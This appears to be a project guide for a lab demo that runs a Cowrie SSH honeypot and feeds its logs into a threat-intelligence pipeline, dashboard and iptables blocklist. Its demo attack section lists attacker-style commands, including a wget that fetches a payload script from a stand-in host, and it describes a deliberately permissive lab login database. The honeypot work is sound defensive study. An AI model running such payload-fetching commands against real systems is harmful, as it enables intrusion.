# Live Lab Demo

This guide connects the project to a real Cowrie honeypot running in an isolated lab so you can attack it from another machine and watch the dashboard update.

## Goal

Use a real Cowrie instance to produce:

- login attempts
- successful sessions
- attacker commands
- download attempts
- saved records in the pipeline
- dashboard updates and report outputs

## Lab Shape

- **Machine A**: the Cowrie host or VM
- **Machine B**: your laptop or another machine used to attack the honeypot
- **This repository** can run on the same host as Cowrie or on a second host that can read the Cowrie JSON log file

The safest setup for tomorrow is:

1. run Cowrie in an isolated VM
2. expose only the demo SSH port
3. run the pipeline and dashboard on the same machine as the repository

## Cowrie Setup

The repo includes a Docker-based Cowrie setup under [docker-compose.yml](/home/fe/honeypot-threat-intelligence-pipeline/docker/cowrie/docker-compose.yml).

This uses the official Cowrie Docker image and binds SSH to port `2222`, matching the Cowrie Docker quick start in the official docs. Cowrie’s docs also identify `var/log/cowrie/cowrie.json` as the JSON audit log that the pipeline should consume. Sources:

- https://docs.cowrie.org/en/stable/docker/README.html
- https://docs.cowrie.org/en/stable/README.html

Start Cowrie:

```bash
scripts/lab-demo.sh up-cowrie
```

Follow container logs:

```bash
scripts/lab-demo.sh cowrie-logs
```

## Pipeline And Dashboard

Run the live pipeline in one terminal:

```bash
scripts/lab-demo.sh pipeline
```

Run the dashboard in another terminal:

```bash
scripts/lab-demo.sh dashboard
```

Open:

`http://127.0.0.1:5000/events?refresh=3`

## Demo Attacks From Your Machine

From your local machine or another VM, connect to the Cowrie host:

```bash
ssh -p 2222 root@<target-ip>
```

The included lab-only [userdb.txt](/home/fe/honeypot-threat-intelligence-pipeline/docker/cowrie/etc/userdb.txt) is intentionally permissive so you can get an interactive shell quickly in the isolated demo environment.

After login, run commands like:

```bash
whoami
uname -a
pwd
ls
wget http://example.com/payload.sh
curl http://example.com
```

These should create:

- authentication events
- command input events
- possible file download events

The Cowrie service runs with host networking (`network_mode: host`) so it
records the real attacker source IP. Behind Docker's default bridge every
connection would otherwise arrive as the gateway address (`172.x.0.1`).

## Offline Attack Replay

To drive the live dashboard without a real SSH connection, generate Cowrie
JSONL offline and inject it into the running log volume:

```bash
# 1. Generate offline events
python3 scripts/attack-simulator.py --scenario full-chain \
  --offline-output /tmp/attack.json --count 5

# 2. Inject into the live volume — the pipeline follower ingests it
scripts/inject-cowrie-log.sh /tmp/attack.json
```

The follower tracks Cowrie's daily log rotation, so injected lines and live
SSH attacks both flow through to the dashboard.

## What To Show

Show the professor:

1. the Cowrie container is running
2. the attack machine connects to port `2222`
3. the pipeline is following the live log file
4. the dashboard updates with new events
5. the detail page shows indicators, classification, and threat-intel fields
6. the project can export a blocklist and markdown report
7. the automated firewall response blocks malicious IPs via iptables

Generate the report bundle:

```bash
scripts/lab-demo.sh report
```

## Automated Blocking Demo

After the pipeline has processed some malicious events:

```bash
# 1. Review what would be blocked (dry-run — safe, no root)
scripts/apply-blocklist.sh review

# 2. Generate a standalone shell script for inspection
scripts/apply-blocklist.sh script
cat reports/generated/blocklist.sh

# 3. Apply the blocklist (requires root)
sudo scripts/apply-blocklist.sh apply

# 4. Verify the rules are active
sudo iptables -L INPUT -n | grep honeypot-block

# 5. Remove blocks when done
sudo scripts/apply-blocklist.sh unblock
```

## Notes

- This setup is for an isolated lab only.
- The permissive login policy in the bundled Cowrie `userdb.txt` is for demonstration only.
- Do not expose this directly to the public internet without proper isolation and a deliberate risk decision.
